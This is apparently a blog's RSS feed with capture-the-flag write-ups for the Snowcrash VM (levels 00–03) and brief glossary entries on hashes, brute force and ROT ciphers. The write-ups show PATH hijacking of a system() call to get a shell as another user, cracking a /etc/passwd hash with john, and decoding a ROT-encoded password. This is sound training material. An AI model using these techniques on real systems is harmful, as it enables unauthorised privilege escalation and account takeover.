</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span></span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gdb level03 -q
Reading symbols from level03...done.
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disas main
   ...
<span style="display:block;width:100%;background-color:#3c3d38">   0x080484f7 &lt;+83&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x80485e0
</span><span style="display:block;width:100%;background-color:#3c3d38">   0x080484fe &lt;+90&gt;:	call   0x80483b0 &lt;system@plt&gt;
</span>   0x08048503 &lt;+95&gt;:	leave
   0x08048504 &lt;+96&gt;:	ret
End of assembler dump.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s 0x80485e0
<span style="display:block;width:100%;background-color:#3c3d38">0x80485e0:	<span style="color:#e6db74">&#34;/usr/bin/env echo Exploit me&#34;</span>
</span></code></pre></td></tr></table>
</div>
</div><p>We jump to what we are interesting in, the <code>system</code> call.<br>
Put it together, we get the following line in <code>C</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">system(<span style="color:#e6db74">&#34;/usr/bin/env echo Exploit me&#34;</span>);
</code></pre></div><h2 id="exploiting-the-executable">Exploiting the executable</h2>
<p>As you can see, we can exploit the <code>system</code> call and making it execute arbitrary code by modifying the <code>PATH</code> <a href="/posts/glossary/env_table">env variable</a>.</p>
<p>With the following example, I manage the execute a shell with the right of <code>flag03</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir /tmp/03
$ cd /tmp/03
$ echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; echo
$ cd
$ <span style="color:#75715e"># We add our dir in first of PATH, so our echo who is executed</span>
$ PATH<span style="color:#f92672">=</span>/tmp/03:$PATH ./level03
$ whoami
flag03
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level02</title>
            <link>/posts/snowcrash/level02/</link>
            <pubDate>Fri, 31 Jul 2020 19:28:20 +0200</pubDate>
            
            <guid>/posts/snowcrash/level02/</guid>
            <description>$ file level02.pcap level02.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 16777216) level02.pcap is a file that contains tcp packets. I will use Wireshark to read the file
just by looking at the tcp stream, we see that the user as enter a password ( but beware of special chars )
we can use that password to connect as flag02
What is Wireshark Wireshark is a packet analyzer tool used for network analysis</description>
            <content type="html"><![CDATA[<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ file level02.pcap
level02.pcap: tcpdump capture file <span style="color:#f92672">(</span>little-endian<span style="color:#f92672">)</span> - version 2.4 <span style="color:#f92672">(</span>Ethernet, capture length 16777216<span style="color:#f92672">)</span>
</code></pre></div><p><code>level02.pcap</code> is a file that contains tcp packets. I will use <strong>Wireshark</strong> to read the file</p>

    <img src="img/wireshark.png"  class="left"  />


<p>just by looking at the <strong>tcp stream</strong>, we see that the user as enter a password ( but beware of special chars )</p>
<p>we can use that password to connect as <code>flag02</code></p>
<h2 id="what-is-wireshark">What is Wireshark</h2>
<p><strong>Wireshark</strong> is a packet analyzer tool used for network analysis</p>
]]></content>
        </item>
        
        <item>
            <title>What is Rainbow table</title>
            <link>/posts/glossary/rainbow_table/</link>
            <pubDate>Tue, 28 Jul 2020 22:10:15 +0200</pubDate>
            
            <guid>/posts/glossary/rainbow_table/</guid>
            <description>A Rainbow table is a table of precomputed-hash values generated from hash function. It is generaly used to crack password.
Source  wikipedia  </description>
            <content type="html"><![CDATA[<p>A <strong>Rainbow table</strong> is a table of precomputed-hash values generated from <a href="/posts/glossary/hash_function">hash function</a>.
It is generaly used to crack password.</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Rainbow_table">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is Brute Force Attack</title>
            <link>/posts/glossary/brute_force/</link>
            <pubDate>Tue, 28 Jul 2020 22:10:10 +0200</pubDate>
            
            <guid>/posts/glossary/brute_force/</guid>
            <description>In cryptography, a brute force attack is when an attacker submit as many as possible passwords with the hope to guess the right password
Source  wikipedia  </description>
            <content type="html"><![CDATA[<p>In cryptography, a <strong>brute force attack</strong> is when an attacker submit as many as possible passwords
with the hope to guess the right password</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Brute-force_attack">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is Hash Function</title>
            <link>/posts/glossary/hash_function/</link>
            <pubDate>Tue, 28 Jul 2020 21:48:30 +0200</pubDate>
            
            <guid>/posts/glossary/hash_function/</guid>
            <description>an hash function is a function that can take data of arbitrary size and output data to fixed size. the output of an hash function is called:
 hash value hashes digest  For example a hash function can be used to map name to index in a fixed-size table ( hash table ) we call this process hashing
Source  wikipedia  </description>
            <content type="html"><![CDATA[<p>an <strong>hash function</strong> is a function that can take data of <strong>arbitrary size</strong> and output data to <strong>fixed size</strong>.
the output of an hash function is called:</p>
<ul>
<li>hash value</li>
<li>hashes</li>
<li>digest</li>
</ul>
<p>For example a <strong>hash function</strong> can be used to map name to index in a fixed-size table ( hash table ) we call this process hashing</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Hash_function">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level01</title>
            <link>/posts/snowcrash/level01/</link>
            <pubDate>Tue, 28 Jul 2020 21:36:02 +0200</pubDate>
            
            <guid>/posts/snowcrash/level01/</guid>
            <description>when looking the file /etc/passwd, we see that the user flag01 has is hash password written in the deprecated password column
$ grep flag01 /etc/passwd flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash It exist some tools to decrypt hash that used different attack method like brute force or wordlist. I will use john for this level.
we extract the line that contains the hash to password.txt
$ ssh -p 4242 level01@snowcrash grep flag01 /etc/passwd &amp;gt; password.txt [ .</description>
            <content type="html"><![CDATA[<p>when looking the file <code>/etc/passwd</code>, we see that the user <strong>flag01</strong> has is <a href="/posts/glossary/hash_function">hash</a> password written in the <em>deprecated password column</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ grep flag01 /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
</code></pre></div><p>It exist some tools to decrypt hash that used different attack method like <a href="/posts/glossary/brute_force">brute force</a> or <a href="/posts/glossary/ranbow_table">wordlist</a>.
I will use <code>john</code> for this level.</p>
<p>we extract the line that contains the hash to <code>password.txt</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ssh -p <span style="color:#ae81ff">4242</span> level01@snowcrash grep flag01 /etc/passwd &gt; password.txt
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
</code></pre></div><p>then we execute <code>john</code> to decrypt the password</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ /usr/sbin/john password.txt
Using default input encoding: UTF-8
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
1g 0:00:00:00 DONE 2/3 <span style="color:#f92672">(</span>2020-08-02 14:13<span style="color:#f92672">)</span> 10.00g/s 89740p/s 89740c/s 89740C/s 123456..nutmegs
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</code></pre></div><p>and that its, we get the password to connect to <code>flag01</code> and get the flag</p>
<h2 id="more-about-how-linux-save-password-of-users">More about how linux save password of users</h2>
<p>the older version of linux was storing the password in the file <code>/etc/passwd</code>.
now linux store user account and password separately in <code>/etc/passwd</code> and <code>/etc/shadow</code> respectively</p>
]]></content>
        </item>
        
        <item>
            <title>What is Rot Permutation</title>
            <link>/posts/glossary/rot_permutation/</link>
            <pubDate>Tue, 28 Jul 2020 18:38:17 +0200</pubDate>
            
            <guid>/posts/glossary/rot_permutation/</guid>
            <description>a Rot Permutation or Cesar Permutation is a method to transform a phrase into another by permuting char with another n-th letter
generally we add the amount of rotation to the function name:
 rotXX | rot-XX where XX is the rotation count
 Example     1 5 10 13 26 &amp;hellip;     a b f k n a &amp;hellip;   b c g l o b &amp;hellip;   c d h m p c &amp;hellip;   &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip;    with rot13 hello world become uryyb jbeyq</description>
            <content type="html"><![CDATA[<p>a Rot Permutation or Cesar Permutation is a method to transform a phrase into another
by permuting char with another n-th letter</p>
<p>generally we add the amount of rotation to the function name:</p>
<blockquote>
<p>rotXX | rot-XX where XX is the rotation count</p>
</blockquote>
<h2 id="example">Example</h2>
<table>
<thead>
<tr>
<th></th>
<th>1</th>
<th>5</th>
<th>10</th>
<th>13</th>
<th>26</th>
<th>&hellip;</th>
</tr>
</thead>
<tbody>
<tr>
<td>a</td>
<td>b</td>
<td>f</td>
<td>k</td>
<td>n</td>
<td>a</td>
<td>&hellip;</td>
</tr>
<tr>
<td>b</td>
<td>c</td>
<td>g</td>
<td>l</td>
<td>o</td>
<td>b</td>
<td>&hellip;</td>
</tr>
<tr>
<td>c</td>
<td>d</td>
<td>h</td>
<td>m</td>
<td>p</td>
<td>c</td>
<td>&hellip;</td>
</tr>
<tr>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
<td>&hellip;</td>
</tr>
</tbody>
</table>
<p>with rot13 <code>hello world</code> become <code>uryyb jbeyq</code></p>
]]></content>
        </item>
        
        <item>
            <title>What is Ctf</title>
            <link>/posts/glossary/ctf/</link>
            <pubDate>Mon, 27 Jul 2020 23:14:17 +0200</pubDate>
            
            <guid>/posts/glossary/ctf/</guid>
            <description>CTF stand for Capture The Flag(s).
It&amp;rsquo;s a type of game/exercise were you, the player need to find the flag.
The flag is generally a string, but it can represented in other way.</description>
            <content type="html"><![CDATA[<p>CTF stand for Capture The Flag(s).</p>
<p>It&rsquo;s a type of game/exercise were you, the player need to find the flag.</p>
<p>The flag is generally a string, but it can represented in other way.</p>
]]></content>
        </item>
        
        <item>
            <title>What is Vm</title>
            <link>/posts/glossary/vm/</link>
            <pubDate>Mon, 27 Jul 2020 23:03:11 +0200</pubDate>
            
            <guid>/posts/glossary/vm/</guid>
            <description>VM stand for Virtual Machine, it&amp;rsquo;s a &amp;ldquo;machine&amp;rdquo; that will be run inside another machine. Crazy right ?
To use a virtual Machine we some software like VirtualBox or VMWare</description>
            <content type="html"><![CDATA[<p>VM stand for Virtual Machine, it&rsquo;s a &ldquo;machine&rdquo; that will be run inside another machine.
Crazy right ?</p>
<p>To use a virtual Machine we some software like VirtualBox or VMWare</p>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level00</title>
            <link>/posts/snowcrash/level00/</link>
            <pubDate>Mon, 27 Jul 2020 22:51:34 +0200</pubDate>
            
            <guid>/posts/snowcrash/level00/</guid>
            <description>on connection to level00, we arrive on a empty home directory
An interesting file because we don&amp;rsquo;t have any file present in the home directory, we search for file related to the user flag00, our target.
first we search for with flag00 as owner
$ find / -user flag00 2&amp;gt;/dev/null /usr/sbin/john /rofs/usr/sbin/john Cesar, my old friend The file /usr/sbin/john contains a odd string but its not our password.
$ cat /usr/sbin/john cdiiddwpgswtgt  The filename john refer to a tool to find weak passwords of your users.</description>
            <content type="html"><![CDATA[<p>on connection to level00, we arrive on a empty home directory</p>
<h2 id="an-interesting-file">An interesting file</h2>
<p>because we don&rsquo;t have any file present in the home directory, we search for file related to the user <strong>flag00</strong>, our target.</p>
<p>first we search for with <strong>flag00</strong> as owner</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ find / -user flag00 2&gt;/dev/null
/usr/sbin/john
/rofs/usr/sbin/john
</code></pre></div><h2 id="cesar-my-old-friend">Cesar, my old friend</h2>
<p>The file <code>/usr/sbin/john</code> contains a odd string but its not our password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /usr/sbin/john
cdiiddwpgswtgt
</code></pre></div><blockquote>
<p>The filename <code>john</code> refer to <em>a tool to find weak passwords of your users</em>.</p>
</blockquote>
<p>So the string we found must be decoded first, I go to <a href="https://www.dcode.fr/chiffre-rot">dcode root-n</a> to decode the string using the <a href="/posts/glossary/root_permutation">root permutation</a> method.</p>
<p>With an automatic decode we found an interesting string.</p>
<p>We connect to <strong>flag00</strong> using <code>su flag00</code> with the decoded string, and voila we can get the flag</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://www.dcode.fr">dcode.fr</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash</title>
            <link>/posts/snowcrash/</link>
            <pubDate>Mon, 27 Jul 2020 22:43:44 +0200</pubDate>
            
            <guid>/posts/snowcrash/</guid>
            <description>Introduction Snowcrash is a VM in the style of a CTF.
You have 14 level to complete and get each flags
Summary  Level00: you lost something ? Level01: john, can you give me the flag ? Level02: I want a soda with my shark. Level03: Echo from the past Level04 Level05 Level06 Level07 Level08 Level09 Level10 Level11 Level12 Level13 Level14  </description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Snowcrash is a <a href="/posts/glossary/vm">VM</a> in the style of a <a href="/posts/glossary/ctf">CTF</a>.</p>
<p>You have 14 level to complete and get each flags</p>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="/posts/snowcrash/level00">Level00</a>: you lost something ?</li>
<li><a href="/posts/snowcrash/level01">Level01</a>: john, can you give me the flag ?</li>
<li><a href="/posts/snowcrash/level02">Level02</a>: I want a soda with my shark.</li>
<li><a href="/posts/snowcrash/level03">Level03</a>: Echo from the past</li>
<li><a href="/posts/snowcrash/level04">Level04</a></li>
<li><a href="/posts/snowcrash/level05">Level05</a></li>
<li><a href="/posts/snowcrash/level06">Level06</a></li>
<li><a href="/posts/snowcrash/level07">Level07</a></li>
<li><a href="/posts/snowcrash/level08">Level08</a></li>
<li><a href="/posts/snowcrash/level09">Level09</a></li>
<li><a href="/posts/snowcrash/level10">Level10</a></li>
<li><a href="/posts/snowcrash/level11">Level11</a></li>
<li><a href="/posts/snowcrash/level12">Level12</a></li>
<li><a href="/posts/snowcrash/level13">Level13</a></li>
<li><a href="/posts/snowcrash/level14">Level14</a></li>
</ul>
]]></content>
        </item>
        
    </channel>
</rss>
